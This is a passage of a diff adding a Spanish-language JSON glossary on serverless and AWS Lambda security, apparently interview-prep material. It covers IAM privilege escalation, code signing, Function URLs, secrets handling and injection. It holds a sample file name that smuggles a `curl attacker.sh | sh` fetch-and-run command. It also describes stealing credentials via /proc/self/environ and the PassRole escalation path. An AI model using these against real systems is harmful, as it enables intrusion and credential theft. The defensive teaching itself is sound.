+      "Nunca guardar datos específicos de un usuario o petición (como identidad, tokens de sesión o archivos) en variables globales del módulo; reservar lo global solo para clientes SDK, pools y configuración inmutable.",
+      "Validar autenticación y autorización en cada invocación de forma independiente usando tokens firmados (JWT) o almacenes externos (DynamoDB), sin asumir afinidad de instancia.",
+      "Cifrar en tránsito y en reposo el estado externalizado (p. ej. tablas DynamoDB con KMS y TTL para expiración de sesiones).",
+      "Error típico: usar caché en memoria global para resultados por usuario sin incluir el `user_id` en la clave de caché, provocando fuga de datos entre usuarios en invocaciones calientes."
+    ],
+    "ejemplo": "# MAL: estado por usuario en variable global\n# current_user = None\n\n# BIEN: estado aislado por invocación en el handler\ndef handler(event, context):\n    user_id = event[\"requestContext\"][\"authorizer\"][\"jwt\"][\"claims\"][\"sub\"]\n    return fetch_user_orders(user_id)",
+    "entrevista": "La ejecución sin estado exige que la función no confíe en memoria ni disco local entre peticiones, externalizando el estado en almacenes cifrados y evitando variables globales mutables que causen fuga de datos entre usuarios en contenedores reutilizados."
+  },
+  "Escalada de privilegios en función": {
+    "que": "Vulnerabilidad o vector de ataque mediante el cual un adversario logra obtener permisos superiores a los previstos explotando la configuración IAM, el rol de ejecución, permisos de actualización de código o integraciones de una función serverless.",
+    "para": "Detectar y cerrar rutas de escalada de privilegios en funciones evita que un desarrollador con permisos acotados o un atacante que comprometa una función de bajo riesgo alcance acceso administrativo sobre toda la cuenta cloud.",
+    "como": "La escalada ocurre por dos vías principales: en el plano de control (CI/CD o usuario IAM), cuando un actor tiene `iam:PassRole` combinado con `lambda:CreateFunction` y `lambda:InvokeFunction` (o `lambda:UpdateFunctionCode`), permitiéndole crear o modificar una función asociada a un rol IAM administrativo y ejecutar código arbitrario con ese rol. En el plano de datos, cuando una función comprometida tiene permisos excesivos (como `iam:AttachRolePolicy`, `sts:AssumeRole`, `kms:Decrypt` o `s3:*`) que permiten al atacante asumir roles superiores o modificar políticas desde dentro del handler.",
+    "practicas": [
+      "Restringir `iam:PassRole` con condiciones estrictas (`iam:PassedToService: lambda.amazonaws.com` y ARNs de roles específicos), nunca otorgar `iam:PassRole` sobre `*`.",
+      "Aplicar `Permissions Boundaries` en roles creados por desarrolladores o pipelines para establecer un techo máximo de permisos que ninguna función pueda superar.",
+      "Separar los permisos del pipeline de despliegue de los roles de ejecución y auditar combinaciones peligrosas (como `lambda:UpdateFunctionCode` + roles privilegiados) usando IAM Access Analyzer o herramientas como PMapper/Cloudsplaining.",
+      "Eliminar cualquier permiso de modificación IAM (`iam:*`) del rol de ejecución de funciones de negocio."
+    ],
+    "ejemplo": "{\n  \"Effect\": \"Allow\",\n  \"Action\": \"iam:PassRole\",\n  \"Resource\": \"arn:aws:iam::123456789012:role/app-lambda-*\",\n  \"Condition\": {\n    \"StringEquals\": { \"iam:PassedToService\": \"lambda.amazonaws.com\" }\n  }\n}",
+    "entrevista": "La escalada de privilegios en serverless suele surgir al combinar `iam:PassRole` sin restricciones con `lambda:CreateFunction` o `UpdateFunctionCode`, por lo que debe limitarse el recurso de PassRole y usar Permissions Boundaries."
+  },
+  "Escaneo de imagen de contenedor en Lambda": {
+    "que": "Análisis automatizado de seguridad aplicado a imágenes OCI/Docker almacenadas en un registro (como Amazon ECR) antes y después de desplegarse como funciones AWS Lambda de tipo contenedor (hasta 10 GB).",
+    "para": "Detecta vulnerabilidades conocidas (CVEs) tanto en paquetes del sistema operativo de la imagen base (Debian, Alpine, Amazon Linux) como en dependencias del lenguaje de programación, además de secretos incrustados o configuraciones inseguras, dado que en Lambda con contenedores el usuario asume la responsabilidad de parchear el runtime y el SO.",
+    "como": "Al subir una imagen al repositorio ECR desde el pipeline de CI/CD, herramientas locales (Trivy, Grype, Docker Scout) inspeccionan cada capa del manifiesto OCI antes del `docker push`. Una vez en ECR, el escaneo mejorado con Amazon Inspector analiza continuamente los paquetes OS (`rpm`, `dpkg`, `apk`) y librerías de lenguaje, generando hallazgos en Security Hub y EventBridge si aparecen nuevos CVEs incluso meses después del despliegue. Si se supera un umbral de severidad, una política de pipeline o EventBridge puede bloquear el despliegue o alertar para reconstruir la imagen.",
+    "practicas": [
+      "Utilizar imágenes base oficiales y mínimas (como AWS Lambda base images o distroless) y reconstruirlas periódicamente aunque no cambie el código de negocio.",
+      "Integrar escaneo bloqueante en CI/CD (`trivy image --exit-code 1`) y mantener escaneo continuo activado en ECR (Amazon Inspector Enhanced Scanning) para detectar CVEs zero-day posteriores al despliegue.",
+      "Ejecutar builds multi-stage para no dejar compiladores, gestores de paquetes o claves temporales en la imagen final, y verificar la firma de imagen (Cosign/AWS Signer).",
+      "Error típico: olvidar que al pasar de paquete ZIP a imagen de contenedor en Lambda, AWS deja de actualizar automáticamente el runtime y las librerías base."
+    ],
+    "ejemplo": "trivy image --severity HIGH,CRITICAL --ignore-unfixed --exit-code 1 \\\n  123456789012.dkr.ecr.us-east-1.amazonaws.com/orders-lambda:v1.4.2",
+    "entrevista": "Cuando desplegamos Lambda como imagen de contenedor asumimos el parcheo del SO base y el runtime, por lo que es obligatorio combinar escaneo bloqueante en CI/CD con escaneo continuo en ECR como Amazon Inspector."
+  },
+  "Firma de código en Lambda": {
+    "que": "Control criptográfico de integridad y autenticidad (AWS Lambda Code Signing) que verifica que el paquete ZIP o la imagen de contenedor de una función ha sido firmado por una entidad de confianza y no ha sido alterado antes del despliegue.",
+    "para": "Protege la cadena de suministro frente a despliegues no autorizados, compromiso parcial de buckets S3 de artefactos o manipulación del código por credenciales robadas, asegurando que solo artefactos aprobados por el pipeline oficial puedan ejecutarse en producción.",
+    "como": "Se define un perfil de firma en AWS Signer y una `CodeSigningConfig` asociada a la función Lambda con políticas de validación (`Enforce` o `Warn`). En el pipeline de CI/CD, tras pasar pruebas y análisis de seguridad, el artefacto ZIP se firma criptográficamente con AWS Signer (generando una firma digital adjunta). Cuando alguien intenta crear o actualizar la función (`CreateFunction` o `UpdateFunctionCode`), el servicio Lambda comprueba que el paquete esté firmado por uno de los `SigningProfileVersionArns` permitidos y que la firma no esté revocada ni expirada; si falla y la política es `Enforce`, Lambda rechaza el despliegue.",
+    "practicas": [
+      "Separar los permisos IAM: quien puede desplegar (`lambda:UpdateFunctionCode`) no debe tener permiso para firmar artefactos (`signer:StartSigningJob`) ni modificar la configuración de firma (`lambda:PutFunctionCodeSigningConfig`).",
+      "Configurar `UntrustedArtifactOnDeployment` en `Enforce` en entornos de producción tras validar inicialmente con `Warn`.",
+      "Combinar la firma de código en Lambda con repositorios de artefactos inmutables y revisión obligatoria de Pull Requests para proteger todo el pipeline.",
+      "Para funciones basadas en imágenes de contenedor, complementar con firma de imágenes OCI (AWS Signer + Notation o Sigstore Cosign) verificada en CI/CD."
+    ],
+    "ejemplo": "resource \"aws_lambda_code_signing_config\" \"strict\" {\n  allowed_publishers {\n    signing_profile_version_arns = [aws_signer_signing_profile.ci.version_arn]\n  }\n  policies { untrusted_artifact_on_deployment = \"Enforce\" }\n}",
+    "entrevista": "Code Signing en Lambda garantiza que solo artefactos firmados por AWS Signer desde un pipeline autorizado puedan desplegarse, separando los permisos de firma de los permisos de despliegue."
+  },
+  "Función expuesta públicamente": {
+    "que": "Riesgo de seguridad que se produce cuando una función serverless es invocable directamente desde Internet pública sin autenticación, autorización ni controles de abuso (por ejemplo mediante una Function URL con `AuthType: NONE`, una política basada en recursos con `Principal: \"*\"` o una ruta de API Gateway sin autorizador).",
+    "para": "Detectar y remediar funciones expuestas públicamente previene acceso no autorizado a lógica interna o datos sensibles, ejecución remota de acciones privilegiadas y ataques de denegación de servicio por coste (Denial of Wallet).",
+    "como": "En AWS, una función queda expuesta cuando su `Resource-based Policy` otorga `lambda:InvokeFunction` o `lambda:InvokeFunctionUrl` a `Principal: \"*\"` sin condiciones restrictivas (`aws:SourceArn`, `aws:SourceAccount` o `aws:PrincipalOrgID`), o cuando un API Gateway deja métodos con `Authorization: NONE` accesibles por Internet. Un atacante puede descubrir el endpoint mediante enumeración, logs filtrados o repositorios públicos e invocar la función directamente enviando eventos manipulados, saltándose capas previas de validación.",
+    "practicas": [
+      "Auditar continuamente políticas basadas en recursos de Lambda mediante AWS IAM Access Analyzer y reglas de AWS Config (`lambda-function-public-access-prohibited`).",
+      "Evitar `AuthType: NONE` en Function URLs salvo webhooks públicos que validen firma criptográfica HMAC (p. ej. Stripe/GitHub) dentro del código y estén detrás de CloudFront + WAF.",
+      "Cuando una invocación proceda de un servicio AWS (S3, EventBridge, SNS), exigir siempre condiciones `aws:SourceArn` y `aws:SourceAccount` en la política de recursos para evitar el problema de Confused Deputy.",
+      "Error típico: asumir que una URL larga o aleatoria de Function URL o API Gateway proporciona seguridad por oscuridad."
+    ],
+    "ejemplo": "# Inseguro: permite invocación pública sin condiciones\n# \"Principal\": \"*\", \"Action\": \"lambda:InvokeFunctionUrl\"\n\n# Seguro: restringido a IAM o servicio con SourceArn\naws lambda create-function-url-config --function-name internal-job --auth-type AWS_IAM",
+    "entrevista": "Una función expuesta públicamente por Function URL abierta o política de recursos con `Principal: *` sin condiciones permite invocación directa e ilimitada; se previene usando autenticación IAM/Gateway, validación HMAC si es webhook y auditoría con Access Analyzer."
+  },
+  "Function URL": {
+    "que": "Funcionalidad nativa de AWS Lambda (y equivalente HTTP trigger en Azure/GCP) que asigna un punto de enlace HTTPS dedicado y estable directamente a una función o alias, sin necesidad de desplegar API Gateway ni un Application Load Balancer.",
+    "para": "Sirve para exponer webhooks sencillos, prototipos, microservicios internos autenticados por IAM o endpoints con streaming de respuestas (`RESPONSE_STREAM`) minimizando costes y complejidad de infraestructura.",
+    "como": "Al habilitar una Function URL, AWS genera un dominio único `https://<url-id>.lambda-url.<region>.on.aws` enrutado al alias o `$LATEST` de la función. Soporta dos modos de autenticación: `AWS_IAM` (exige peticiones firmadas con SigV4 y permiso `lambda:InvokeFunctionUrl`) y `NONE` (acceso público, donde AWS añade automáticamente una declaración `Principal: \"*\"` condicionada a `lambda:FunctionUrlAuthType: NONE`). Además permite configurar cabeceras CORS y modo de invocación `BUFFERED` o `RESPONSE_STREAM`, aunque carece de WAF integrado directo, caché, planes de uso o authorizers JWT nativos.",
+    "practicas": [
+      "Preferir `AWS_IAM` por defecto para comunicación interna entre servicios o detrás de CloudFront con Origin Access Control (OAC) para firmar peticiones hacia la Function URL.",
+      "Si se usa `AuthType: NONE` (p. ej. para un webhook), validar obligatoriamente una firma HMAC-SHA256 del cuerpo en el código, limitar concurrencia reservada y configurar CORS restrictivo (nunca `*` con credenciales).",
+      "Recordar que `Function URL` no tiene rate limiting granular por IP ni validadores de esquema integrados como API Gateway; si la API crece o requiere JWT/OAuth/WAF nativo, migrar a API Gateway.",
+      "Error típico: olvidar que al crear una Function URL con `AuthType: NONE` se modifica la Resource Policy de la función abriéndola a Internet."
+    ],
+    "ejemplo": "resource \"aws_lambda_function_url\" \"webhook\" {\n  function_name      = aws_lambda_function.webhook.function_name\n  authorization_type = \"AWS_IAM\"\n  cors {\n    allow_origins = [\"https://app.ejemplo.com\"]\n    allow_methods = [\"POST\"]\n  }\n}",
+    "entrevista": "Las Function URLs exponen una Lambda directamente por HTTPS con menor coste y soporte de streaming, pero carecen de authorizers JWT o WAF directo, por lo que en producción deben protegerse con `AWS_IAM` (p. ej. tras CloudFront OAC) o validación HMAC estricta."
+  },
+  "Function as a Service (FaaS)": {
+    "que": "Modelo de computación en la nube orientado a eventos donde el desarrollador despliega únicamente bloques de código individuales (funciones) y el proveedor gestiona por completo el aprovisionamiento de servidores, aislamiento, escalado automático y cobro por tiempo de ejecución.",
+    "para": "Permite construir backends, automatizaciones y pipelines de eventos con alta elasticidad y bajo coste operativo, desplazando el enfoque de seguridad desde la administración de sistemas operativos hacia la identidad (IAM), la validación de eventos y la seguridad de dependencias.",
+    "como": "Una fuente de eventos (HTTP vía API Gateway, objetos en S3, colas SQS, cron en EventBridge) dispara el plano de control del proveedor FaaS (AWS Lambda, Azure Functions, Google Cloud Functions). El proveedor asigna una microVM aislada (como Firecracker en AWS), inyecta credenciales temporales del rol asociado y variables de entorno, e invoca la función pasándole un payload JSON estructurado (`event`) y metadatos (`context`). La función procesa el evento, interactúa con servicios autorizados y termina, escalando desde cero hasta miles de instancias en paralelo.",
+    "practicas": [
+      "Cambiar el perímetro de defensa: en FaaS la identidad IAM por función y la validación estricta de cada evento reemplazan al firewall tradicional de red como control principal.",
+      "Diseñar funciones pequeñas, de responsabilidad única (Single Responsibility), para poder asignar permisos IAM granulares por función en lugar de un monolito con permisos amplios.",
+      "Mantener inventario y gobernanza para evitar el fenómeno de 'function sprawl' (decenas de funciones huérfanas sin parchear ni monitorizar).",
+      "Error típico: trasladar patrones de servidor monolítico (sesiones en memoria, múltiples rutas admin en una misma función) a FaaS, anulando sus beneficios de aislamiento."
+    ],
+    "ejemplo": "# Handler mínimo FaaS orientado a eventos\ndef lambda_handler(event, context):\n    # Cada función recibe un evento concreto y opera con un rol IAM dedicado\n    order_id = event.get(\"detail\", {}).get(\"orderId\")\n    return {\"processed\": bool(order_id)}",
+    "entrevista": "En FaaS, el proveedor abstrae la infraestructura y el sistema operativo, desplazando la seguridad hacia el principio de menor privilegio IAM por función, la validación estricta de eventos no confiables y el control de dependencias."
+  },
+  "Integración con Secrets Manager": {
+    "que": "Patrón de seguridad mediante el cual una función serverless recupera en tiempo de ejecución credenciales dinámicas, tokens de API o claves de base de datos desde un gestor centralizado y cifrado como AWS Secrets Manager, en lugar de incrustarlos en código o variables de entorno.",
+    "para": "Elimina secretos estáticos del repositorio, de la configuración de despliegue y de la consola de Lambda, habilitando rotación automática de credenciales (p. ej. RDS) y auditoría detallada de qué función accedió a cada secreto y cuándo.",
+    "como": "El rol de ejecución de la función recibe permiso `secretsmanager:GetSecretValue` (y `kms:Decrypt` si usa CMK) acotado al ARN exacto del secreto. En lugar de llamar a la API de Secrets Manager en cada invocación (lo que añade latencia y coste), se recomienda usar la extensión oficial *AWS Parameters and Secrets Lambda Extension* (capa local que cachea en `http://localhost:2773` con TTL configurable) o cachear el secreto en la fase `Init` manejando refresco ante errores de autenticación por rotación.",
+    "practicas": [
+      "Usar la extensión local de caché (AWS Parameters and Secrets Lambda Extension) o caché en memoria con TTL para evitar saturar cuotas de API, reducir latencia y ahorrar costes por llamada.",
+      "Configurar rotación automática del secreto (p. ej. cada 30 días para RDS) y programar la función para reintentar cargando el secreto nuevo si recibe un error de credenciales inválidas.",
+      "Si la función está dentro de una VPC sin salida a Internet, crear un Interface VPC Endpoint para `secretsmanager` para que el tráfico nunca abandone la red privada de AWS.",
+      "Error típico: pasar el valor del secreto en una variable de entorno desde Terraform/CloudFormation (`data.aws_secretsmanager_secret_version`) en tiempo de despliegue, anulando la rotación y dejando el secreto en el estado de Terraform."
+    ],
+    "ejemplo": "import urllib.request, os, json\n\ndef get_secret(secret_name):\n    req = urllib.request.Request(\n        f\"http://localhost:2773/secretsmanager/get?secretId={secret_name}\",\n        headers={\"X-Aws-Parameters-Secrets-Token\": os.environ[\"AWS_SESSION_TOKEN\"]}\n    )\n    return json.loads(urllib.request.urlopen(req).read())[\"SecretString\"]",
+    "entrevista": "Integrar Lambda con Secrets Manager mediante la extensión de caché local y permisos acotados al ARN del secreto elimina credenciales estáticas en variables de entorno, permite rotación automática y funciona de forma privada usando un VPC Endpoint."
+  },
+  "Inyección de datos de evento": {
+    "que": "Subtipo de inyección en arquitecturas serverless donde el payload malicioso no proviene de un formulario web HTTP convencional, sino de metadatos o campos manipulados dentro de eventos asíncronos (nombres de objetos en S3, atributos de mensajes SQS/SNS, registros de DynamoDB Streams o campos de correo SES).",
+    "para": "Reconocer este vector es fundamental porque muchos desarrolladores validan estrictamente las APIs REST, pero confían ciegamente en eventos internos generados por servicios cloud asumiendo que son seguros.",
+    "como": "Un atacante sube un archivo a un bucket S3 cuyo nombre contiene metacaracteres de shell o path traversal (p. ej. `factura; curl attacker.sh | sh;.pdf` o `../../config`), o introduce una cadena SQL/NoSQL maliciosa en un documento que luego dispara DynamoDB Streams o SQS. El servicio cloud entrega el evento intacto a la función Lambda. Si la función construye un comando de sistema (`subprocess` con `shell=True` para procesar el PDF con ImageMagick/FFmpeg) o interpola el campo en una consulta SQL/path local sin sanitizar, ejecuta el payload del atacante.",
+    "practicas": [
+      "Tratar TODOS los campos de `event` (incluidos `s3.object.key`, `Records[].body`, headers de correo o metadatos) como entrada no confiable sujeta a validación de esquema estricto (JSON Schema, Pydantic, Zod).",
+      "Nunca usar `shell=True` ni concatenar nombres de archivo en comandos externos; pasar argumentos como lista de strings y generar nombres aleatorios (UUID) al guardar archivos en `/tmp`.",
+      "Aplicar consultas parametrizadas siempre, incluso en workers asíncronos internos que leen de colas SQS o streams.",
+      "Recordar que las claves de objeto S3 llegan codificadas en URL (`urllib.parse.unquote_plus`) dentro del evento Lambda, lo que puede usarse para evadir filtros ingenuos si se valida antes de decodificar."
+    ],
+    "ejemplo": "import subprocess, urllib.parse, uuid\n\nkey = urllib.parse.unquote_plus(event[\"Records\"][0][\"s3\"][\"object\"][\"key\"])\n# Seguro: ruta local aleatoria y shell=False (lista de argumentos)\nsafe_local = f\"/tmp/{uuid.uuid4()}.pdf\"\nsubprocess.run([\"/opt/bin/pdftotext\", safe_local, \"-\"], check=True, shell=False)",
+    "entrevista": "En serverless la superficie de entrada no es solo HTTP: nombres de archivos S3, mensajes SQS o streams pueden transportar payloads de inyección de comandos o SQL, por lo que todo evento debe validarse con esquema y procesarse sin interpolación ni `shell=True`."
+  },
+  "Inyección en serverless": {
+    "que": "Vulnerabilidad crítica (n.º 1 en el OWASP Serverless Top 10) en la que datos no confiables recibidos por una función FaaS son interpretados como código o comandos por un intérprete SQL, NoSQL, LDAP, sistema operativo, motor de plantillas o evaluador dinámico (`eval`).",
+    "para": "Prevenir inyecciones en serverless evita que un atacante tome control de la microVM efímera, lea variables de entorno, robe el token de sesión IAM del entorno de ejecución y pivote hacia bases de datos, buckets S3 o servicios internos.",
+    "como": "El atacante envía una carga maliciosa a través de cualquier disparador (HTTP en API Gateway, S3, DynamoDB, SQS, IoT). Cuando la función concatena directamente esa entrada en una sentencia SQL, un filtro NoSQL de DynamoDB/MongoDB, una llamada `exec()`/`os.system()` o una expresión `eval()`, el intérprete ejecuta la lógica inyectada. Desde una ejecución de comandos en Lambda, el atacante puede leer `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY` y `AWS_SESSION_TOKEN` de `/proc/self/environ` y usar las credenciales desde su propia máquina mientras dure la sesión temporal.",
+    "practicas": [
+      "Validar y tipar todas las entradas al inicio del handler usando validadores de esquema estrictos (Pydantic, Zod, Joi, JSON Schema en API Gateway).",
+      "Utilizar consultas parametrizadas / `ExpressionAttributeValues` en DynamoDB y APIs nativas del lenguaje en lugar de comandos shell o `eval()`.",
+      "Aplicar el principio de menor privilegio en el rol IAM para contener el radio de impacto (blast radius) en caso de que ocurra una inyección.",
+      "Deshabilitar permisos innecesarios de red saliente (egress en VPC) para dificultar la exfiltración de datos o tokens robados hacia servidores externos."
+    ],
+    "ejemplo": "# Seguro en DynamoDB usando ExpressionAttributeValues (sin concatenación)\ndynamodb.query(\n    TableName=\"Orders\",\n    KeyConditionExpression=\"userId = :uid\",\n    ExpressionAttributeValues={\":uid\": {\"S\": validated_user_id}}\n)",
+    "entrevista": "La inyección en serverless es especialmente grave porque un RCE permite leer inmediatamente las credenciales temporales IAM del entorno y exfiltrar datos; se mitiga validando esquemas de todo disparador, parametrizando consultas y acotando el rol IAM."
+  },
+  "Logging en Lambda": {
+    "que": "Estrategia y configuración técnica de registro estructurado de eventos de aplicación, errores y seguridad dentro de funciones serverless, garantizando trazabilidad sin filtrar información confidencial.",
+    "para": "Permite investigar incidentes de seguridad, correlacionar peticiones entre microservicios distribuidos (trazabilidad por `RequestId` / X-Ray) y detectar anomalías como fallos repetidos de autorización o intentos de inyección, sin violar privacidad ni normativas.",
+    "como": "En lugar de usar `print` con texto plano, la función emite logs en formato JSON estructurado (usando librerías como AWS Lambda Powertools) incluyendo `awsRequestId`, nivel de log (`INFO`, `WARN`, `ERROR`) y metadatos de contexto. Desde el runtime moderno de Lambda se puede configurar `LoggingConfig` (`LogFormat = JSON`, `ApplicationLogLevel`, `SystemLogLevel`) para que la plataforma filtre niveles sin cambiar código. Los logs fluyen vía Telemetry API hacia CloudWatch Logs o extensiones personalizadas hacia sistemas SIEM externos.",
+    "practicas": [
+      "Nunca registrar secretos, contraseñas, tokens JWT/Bearer completos, cabeceras `Authorization`, ni el objeto `event` completo sin sanitizar (puede contener PII o claves).",
+      "Usar logs estructurados en JSON con `correlation_id` o `aws_request_id` para poder consultar incidentes rápidamente con CloudWatch Logs Insights o un SIEM.",
+      "Activar el control `LoggingConfig` nativo de Lambda para ajustar el nivel de detalle en producción (`WARN`/`INFO`) sin redesplegar código ni inundar los logs con `DEBUG`.",
+      "Registrar explícitamente eventos de seguridad relevantes: denegaciones de acceso (403), firmas inválidas de webhook, errores de validación de esquema y rotaciones de credenciales."
+    ],
+    "ejemplo": "from aws_lambda_powertools import Logger\nlogger = Logger(service=\"auth-service\")\n\ndef handler(event, context):\n    logger.info(\"Acceso denegado\", extra={\"user_id\": \"u-102\", \"reason\": \"invalid_scope\"})",
+    "entrevista": "Un buen logging en Lambda combina formato JSON estructurado con `aws_request_id`, registro de eventos de seguridad (401/403) y sanitización estricta para nunca volcar el `event` completo ni credenciales en CloudWatch."
+  },
+  "Modelo de amenazas serverless": {
+    "que": "Metodología estructurada (como STRIDE adaptado a arquitecturas orientadas a eventos) para identificar activos, superficies de entrada, fronteras de confianza, rutas de ataque y controles mitigadores específicos de aplicaciones basadas en FaaS y BaaS.",
+    "para": "Permite descubrir riesgos arquitectónicos antes de escribir código o desplegar en producción, contemplando vectores propios de serverless como disparadores asíncronos, cadenas de eventos, permisos IAM y límites de concurrencia que los modelos tradicionales de servidores omiten.",
+    "como": "El proceso comienza descomponiendo la arquitectura en diagramas de flujo de datos: fuentes de eventos (API Gateway, S3, SQS, EventBridge), funciones Lambda, roles IAM, secretos y almacenes BaaS (DynamoDB, RDS). Sobre cada flecha y nodo se evalúan amenazas: Spoofing (tokens JWT/IAM), Tampering (inyección en eventos S3/SQS), Repudiation (ausencia de CloudTrail/logs estructurados), Information Disclosure (variables de entorno, logs con PII, buckets), Denial of Service (concurrencia/coste) y Elevation of Privilege (`PassRole`, roles compartidos). Finalmente se asignan controles concretos a cada riesgo.",
+    "practicas": [
+      "Modelar cada disparador de eventos (no solo HTTP) como una frontera de confianza no confiable que requiere validación y autorización.",
+      "Mapear las relaciones `Función -> Rol IAM -> Recursos` para detectar funciones con permisos compartidos o rutas hacia datos críticos.",
+      "Incluir riesgos de flujo económico (DoW / bucles infinitos entre S3/SQS y Lambda) dentro de la categoría de Disponibilidad del modelo de amenazas.",
+      "Revisar el modelo de amenazas cada vez que se añade un nuevo trigger, capa compartida o integración con un servicio externo."
+    ],
+    "ejemplo": "# Ejemplo de matriz STRIDE rápida para flujo S3 -> Lambda -> DynamoDB\n# - Tampering: nombre de archivo S3 con metacaracteres -> validar extensión + UUID local\n# - Elevation of Privilege: rol compartido -> rol dedicado con dynamodb:PutItem solo en tabla destino\n# - DoS/DoW: Lambda escribe en mismo bucket origen -> separar bucket input/output + filtro de prefijo",
+    "entrevista": "El modelo de amenazas serverless adapta STRIDE a arquitecturas orientadas a eventos, poniendo el foco en los múltiples triggers no confiables, las relaciones IAM de cada función, las fugas en logs/variables y los bucles de concurrencia o coste."
+  },
+  "Modelo de responsabilidad compartida serverless": {
+    "que": "Marco contractual y operativo que delimita qué controles de seguridad gestiona el proveedor cloud (seguridad *de* la nube) y cuáles corresponden al cliente (seguridad *en* la nube) cuando se adoptan servicios FaaS y BaaS.",
+    "para": "Evita brechas por falsas suposiciones ('el proveedor se encarga de todo en serverless') y asigna responsabilidades claras entre equipos de plataforma, desarrollo y AppSec sobre código, identidades, datos y configuración.",
+    "como": "En comparación con IaaS (EC2) o contenedores autogestionados (EKS), serverless traslada hacia el proveedor la seguridad física, hipervisor, aislamiento de microVMs, parcheo del sistema operativo anfitrión y actualización menor del runtime gestionado (si se despliega como ZIP). Sin embargo, el cliente mantiene responsabilidad total sobre: código de la función, dependencias y capas, configuración IAM y permisos de menor privilegio, cifrado y gestión de secretos, validación de eventos, configuración de API Gateway/WAF, retención de logs y, si usa imágenes de contenedor, el mantenimiento del SO base y runtime dentro de la imagen.",
+    "practicas": [
+      "Recordar que el código de la aplicación, sus librerías de terceros y los permisos IAM son SIEMPRE responsabilidad del cliente, independientemente de que sea serverless.",
+      "Diferenciar el despliegue ZIP (el proveedor parchea el runtime gestionado) del despliegue con imagen de contenedor (el cliente parchea el SO base y el runtime de la imagen).",
+      "Complementar la seguridad nativa del proveedor con controles propios de AppSec: SAST, SCA, escaneo de IaC, WAF y pruebas de autorización.",
+      "Error típico: asumir que usar AWS Lambda elimina el riesgo de RCE o hace innecesario gestionar vulnerabilidades de dependencias."
+    ],
+    "ejemplo": "# División resumida:\n# Proveedor (AWS/Azure/GCP): Hardware, Firecracker/sandbox, OS host, parcheo runtime ZIP.\n# Cliente (DevSecOps): Código, librerías (SCA), IAM roles, secretos, API Auth, eventos, logs.",
+    "entrevista": "En el modelo de responsabilidad compartida serverless, el proveedor asegura la infraestructura, el aislamiento y los runtimes ZIP gestionados, mientras el cliente sigue siendo responsable del código, las dependencias, los permisos IAM, los secretos y la autorización."
+  },
+  "OWASP Serverless Top 10": {
+    "que": "Proyecto de referencia de OWASP (Serverless Top 10) que clasifica los diez riesgos de seguridad más críticos y específicos en aplicaciones basadas en arquitecturas serverless y Function as a Service.",
+    "para": "Sirve como guía estándar para auditorías AppSec, diseño de arquitecturas seguras, capacitación de desarrolladores y priorización de controles en pipelines DevSecOps para entornos FaaS.",
+    "como": "Adapta el enfoque del OWASP Top 10 tradicional a la realidad orientada a eventos y sin servidores. Sus categorías principales incluyen: SAS-1 Inyección (HTTP y eventos asíncronos), SAS-2 Autenticación rota (endpoints y disparadores mal protegidos), SAS-3 Exposición de datos sensibles (variables de entorno, logs, `/tmp`, buckets), SAS-4 Entidades externas XML (XXE), SAS-5 Control de acceso roto (roles IAM excesivos y autorización en función), SAS-6 Configuración de seguridad incorrecta, SAS-7 Cross-Site Scripting (XSS), SAS-8 Deserialización insegura, SAS-9 Uso de componentes con vulnerabilidades conocidas (dependencias/capas) y SAS-10 Registro y monitorización insuficientes.",
+    "practicas": [
+      "Usar SAS-1 (Inyección en eventos) y SAS-5 (Permisos IAM excesivos / control de acceso roto) como las dos prioridades iniciales en cualquier revisión de seguridad serverless.",
+      "Integrar verificaciones automatizadas para SAS-6 (IaC scanning con Checkov/tfsec) y SAS-9 (SCA en CI/CD + Inspector).",
+      "Cruzar el OWASP Serverless Top 10 con el OWASP API Security Top 10 cuando las funciones se exponen mediante API Gateway.",
+      "Error típico: aplicar solo checklists de servidores web tradicionales e ignorar vectores propios como DoW, permisos IAM compartidos o inyección vía S3/SQS."
+    ],
+    "ejemplo": "# Mapeo rápido OWASP Serverless Top 10 -> Control:\n# SAS-1 Inyección -> Esquemas estrictos + consultas parametrizadas\n# SAS-3 Datos sensibles -> Secrets Manager + cifrado logs/KMS\n# SAS-5 Control acceso -> Rol IAM único por función + auth en API Gateway\n# SAS-9 Dependencias -> SCA en CI/CD + Amazon Inspector",
+    "entrevista": "El OWASP Serverless Top 10 adapta los riesgos AppSec al paradigma FaaS, destacando la inyección en múltiples fuentes de eventos, los roles IAM excesivos, la fuga de secretos en configuración o logs y las dependencias vulnerables."
+  },
+  "Permisos a nivel de función": {
+    "que": "Principio y patrón de diseño IAM mediante el cual cada función serverless posee su propio rol de ejecución independiente con políticas acotadas exactamente a las acciones y recursos que esa función concreta necesita realizar.",
+    "para": "Minimiza el radio de impacto (blast radius) en caso de que una sola función sea comprometida por una vulnerabilidad de código o dependencia, impidiendo que un atacante reutilice los permisos destinados a otras funciones del mismo servicio.",
+    "como": "En lugar de crear un único rol IAM compartido para todas las funciones de un microservicio (como suele ocurrir por defecto en frameworks como Serverless Framework o SAM si no se configura), cada definición de función declara su propio `Role` con una política inline o administrada específica. Por ejemplo, la función `create-order` solo tiene `dynamodb:PutItem` sobre la tabla `Orders`, mientras que `read-order` solo tiene `dynamodb:GetItem`, y ninguna puede borrar la tabla ni acceder a buckets ajenos.",
+    "practicas": [
+      "Configurar un rol IAM dedicado por cada función incluso dentro del mismo repositorio o stack de Terraform/Serverless/SAM.",
+      "Acotar siempre tanto la acción (`dynamodb:PutItem`, no `dynamodb:*`) como el ARN exacto del recurso (tabla, cola, bucket/prefijo, secreto específico).",
+      "Evitar las configuraciones globales `iamRoleStatements` compartidas entre funciones en Serverless Framework; usar el plugin `serverless-iam-roles-per-function` o roles individuales por función.",
+      "Validar periódicamente permisos no utilizados con IAM Access Analyzer para generar políticas basadas en actividad real observada en CloudTrail."
+    ],
+    "ejemplo": "functions:\n  getOrder:\n    handler: src/get.handler\n    iamRoleStatements:\n      - Effect: Allow\n        Action: [\"dynamodb:GetItem\"]\n        Resource: \"arn:aws:dynamodb:us-east-1:123456789012:table/Orders\"",
+    "entrevista": "Implementar permisos a nivel de función asignando un rol IAM dedicado por cada Lambda y restringido a acciones y ARNs específicos contiene el radio de impacto si una función resulta comprometida."
+  },
+  "Permisos excesivos de función": {
+    "que": "Riesgo crítico de seguridad (ligado a SAS-5 de OWASP Serverless Top 10) en el que el rol de ejecución de una función serverless dispone de más acciones, recursos comodín (`*`) o privilegios administrativos de los estrictamente necesarios para su tarea.",
